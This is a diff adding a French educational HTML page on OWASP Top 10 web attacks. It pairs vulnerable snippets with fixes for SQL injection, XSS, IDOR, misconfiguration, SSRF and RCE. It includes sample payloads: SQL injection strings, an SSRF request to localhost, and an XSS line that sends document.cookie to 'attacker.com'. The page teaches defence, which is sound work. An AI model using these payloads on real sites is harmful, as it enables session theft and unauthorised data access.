@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attaques Web | Mémo Cybersécurité</title>
+    <meta name="description"
+        content="Guide sur les attaques Web (OWASP Top 10) : SQL Injection, XSS, SSRF, IDOR et comment s'en protéger.">
+    <meta name="theme-color" content="#303030">
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Outfit:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link rel="stylesheet" href="../assets/css/quiz-style.css">
+</head>
+
+<body>
+    <header></header>
+
+    <main>
+        <!-- MODULE 01: ATTAQUES WEB ÉTENDUES -->
+        <section id="m1"
+            style="padding-top:120px; padding-bottom:60px; min-height:80vh; background: radial-gradient(circle at center, rgba(255, 118, 117, 0.05) 0%, transparent 60%);">
+            <div class="container">
+                <div class="sec-header">
+                    <div class="sec-num"
+                        style="background:linear-gradient(135deg, #d63031, #ff7675); border-color:#d63031;">01</div>
+                    <div>
+                        <h2 class="sec-title" style="color:#d63031;">Attaques Web</h2>
+                        <p class="sec-sub">OWASP Top 10 : Comprendre pour Défendre</p>
+                    </div>
+                </div>
+
+                <!-- INTRO M1 -->
+                <div class="intro-box"
+                    style="margin-bottom:30px; border-left:4px solid #d63031; background:rgba(214, 48, 49, 0.05); padding:20px;">
+                    <h4 style="color:#ff7675; margin-bottom:10px;">🌍 Le Web : La Surface d'Attaque n°1</h4>
+                    <p style="font-size:0.95rem; line-height:1.6;">
+                        Le web est la porte d'entrée la plus exposée. Les applications sont complexes et les erreurs
+                        humaines fréquentes.
+                        L'<strong>OWASP Top 10</strong> recense les vulnérabilités les plus critiques qu'il faut
+                        absolument
+                        maîtriser pour ne pas laisser les clés sous le paillasson.
+                    </p>
+                </div>
+
+                <div class="attack-grid">
+
+                    <!-- SQL INJECTION -->
+                    <div class="attack-detail-card">
+                        <div class="attack-header">
+                            <h3 style="color:#ff7675">💉 SQL Injection (SQLi)</h3>
+                            <span style="font-size:1.5rem">🗄️</span>
+                        </div>
+                        <div class="attack-body">
+                            <p>L'attaquant manipule une requête SQL pour voler ou détruire la base de données.</p>
+                            <details class="code-reveal">
+                                <summary class="reveal-btn">Voir l'exemple concret</summary>
+                                <div class="code-block">
+                                    <div class="code-bad">
+                                        // ❌ VULNÉRABLE<br>
+                                        query = "SELECT * FROM users WHERE id = " + userInput;
+                                        <br><span style="color:#74b9ff">// Si userInput = "1 OR 1=1", il dump tout
+                                            !</span>
+                                    </div>
+                                    <div class="code-good">
+                                        // ✅ SÉCURISÉ (Prepared Statements)<br>
+                                        query = "SELECT * FROM users WHERE id = ?";<br>
+                                        db.execute(query, [userInput]);
+                                    </div>
+                                </div>
+                            </details>
+                        </div>
+                    </div>
+
+                    <!-- XSS -->
+                    <div class="attack-detail-card">
+                        <div class="attack-header">
+                            <h3 style="color:#ff7675">🎭 XSS (Cross-Site Scripting)</h3>
+                            <span style="font-size:1.5rem">🌐</span>
+                        </div>
+                        <div class="attack-body">
+                            <p>Injection de scripts JS malveillants exécutés dans le navigateur de la victime.</p>
+                            <details class="code-reveal">
+                                <summary class="reveal-btn">Voir l'exemple concret</summary>
+                                <div class="code-block">
+                                    <div class="code-bad">
+                                        // ❌ VULNÉRABLE (React/Vanilla)<br>
+                                        div.innerHTML = userComment;<br>
+                                        <span style="color:#74b9ff">// Si userComment =
+                                            "&lt;script&gt;stealCookies()&lt;/script&gt;"</span>
+                                    </div>
+                                    <div class="code-good">
+                                        // ✅ SÉCURISÉ (Sanitization)<br>
+                                        div.innerText = userComment;<br>
+                                        // ou utiliser DOMPurify
+                                    </div>
+                                </div>
+                            </details>
+                        </div>
+                    </div>
+
+                    <!-- BROKEN ACCESS CONTROL -->
+                    <div class="attack-detail-card">
+                        <div class="attack-header">
+                            <h3 style="color:#ff7675">🚪 Broken Access (IDOR)</h3>
+                            <span style="font-size:1.5rem">🚫</span>
+                        </div>
+                        <div class="attack-body">
+                            <p>Un utilisateur accède aux données d'un autre en changeant simplement l'ID.</p>
+                            <details class="code-reveal">
+                                <summary class="reveal-btn">Voir l'exemple concret</summary>
+                                <div class="code-block">
+                                    <div class="code-bad">
+                                        // ❌ URL modifiable : /profile?id=123<br>
+                                        // Je change en /profile?id=1 (Admin ?)
+                                    </div>
+                                    <div class="code-good">
+                                        // ✅ SÉCURISÉ<br>
+                                        if (currentUser.id !== request.id) {<br>
+                                        throw new Error("403 Forbidden");<br>
+                                        }
+                                    </div>
+                                </div>
+                            </details>
+                        </div>
+                    </div>
+
+                    <!-- SECURITY MISCONFIG -->
+                    <div class="attack-detail-card">
+                        <div class="attack-header">
+                            <h3 style="color:#ff7675">⚙️ Misconfiguration</h3>
+                            <span style="font-size:1.5rem">⚠️</span>
+                        </div>
+                        <div class="attack-body">
+                            <p>Erreurs par défaut, logs verbeux, ou services inutiles exposés.</p>
+                            <details class="code-reveal">
+                                <summary class="reveal-btn">Voir l'exemple concret</summary>
+                                <div class="code-block">
+                                    <ul style="list-style:none; padding:0;">
+                                        <li>❌ Laisser `admin/admin` par défaut.</li>
+                                        <li>❌ Afficher les Stack Traces complètes aux utilisateurs.</li>
+                                        <li>❌ Laisser le port 22 (SSH) ouvert à tous (0.0.0.0/0).</li>
+                                        <li style="margin-top:10px; color:#55efc4">✅ Hardening : Désactiver tout ce qui
+                                            est
+                                            inutile.</li>
+                                    </ul>
+                                </div>
+                            </details>
+                        </div>
+                    </div>
+
+                </div>
+                <div>
+                    <div class="attack-card">
+                        <div class="attack-title">
+                            <span>💉 SQL Injection (SQLi)</span>
+                            <span style="font-size:0.8rem;">Critique</span>
+                        </div>
+                        <p style="font-size:0.9rem; color:var(--text); margin-bottom:8px;">
+                            L'attaquant manipule la requête BDD via une entrée utilisateur non assainie.
+                        </p>
+                        <div class="code" style="margin:5px 0;">
+                            <pre><span class="c">-- Payload</span>
+' OR 1=1 --
+<span class="c">-- Résultat</span>
+SELECT * FROM users WHERE id = '' OR 1=1 --'</pre>
+                        </div>
+                        <div class="remediation-box">
+                            <strong>🛡️ Fix:</strong> Utiliser des <code>Prepared Statements</code> (PDO/ORM) qui
+                            séparent code et données.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- DETAILED ATTACKS GRID -->
+                <h3
+                    style="color:#fff; margin-top:30px; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px;">
+                    🕵️ Autres Vecteurs Critiques</h3>
+                <div class="grid2">
+                    <div class="tool-card" style="padding:15px;">
+                        <details>
+                            <summary style="font-weight:bold; color:#ff7675; cursor:pointer;">🎭 XSS (Cross-Site
+                                Scripting)
+                            </summary>
+                            <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                                <p>Execution de JS dans le navigateur de la victime. Vol de session (Cookies).</p>
+                                <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                                    &lt;script&gt;fetch('attacker.com?cookie='+document.cookie)&lt;/script&gt;
+                                </div>
+                            </div>
+                        </details>
+                    </div>
+
+                    <div class="tool-card" style="padding:15px;">
+                        <details>
+                            <summary style="font-weight:bold; color:#fdcb6e; cursor:pointer;">👺 SSRF (Server Request
+                                Forgery)
+                            </summary>
+                            <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                                <p>Forcer le serveur à attaquer le réseau interne.</p>
+                                <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                                    GET /fetch?url=http://localhost/admin
+                                </div>
+                            </div>
+                        </details>
+                    </div>
+
+                    <div class="tool-card" style="padding:15px;">
+                        <details>
+                            <summary style="font-weight:bold; color:#74b9ff; cursor:pointer;">🆔 IDOR (Direct Object
+                                Ref)
+                            </summary>
+                            <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                                <p>Changer un ID dans l'URL pour voir la facture du voisin.</p>
+                                <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                                    GET /invoice/123 ➔ GET /invoice/124
+                                </div>
+                            </div>
+                        </details>
+                    </div>
+
+                    <div class="tool-card" style="padding:15px;">
+                        <details>
+                            <summary style="font-weight:bold; color:#e17055; cursor:pointer;">📡 RCE (Remote Code Exec)
+                            </summary>
+                            <div class="details-content" style="margin-top:10px; font-size:0.9rem;">
+                                <p>L'attaquant exécute des commandes Shell sur le serveur.</p>
+                                <div class="code" style="font-size:0.8rem; margin-top:5px;">
+                                    System.exec(userInput)
+                                </div>
+                            </div>
+                        </details>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer></footer>
+    <script src="../assets/js/layout.js"></script>
+    <script src="../assets/js/script.js"></script>
+</body>
+
+</html>
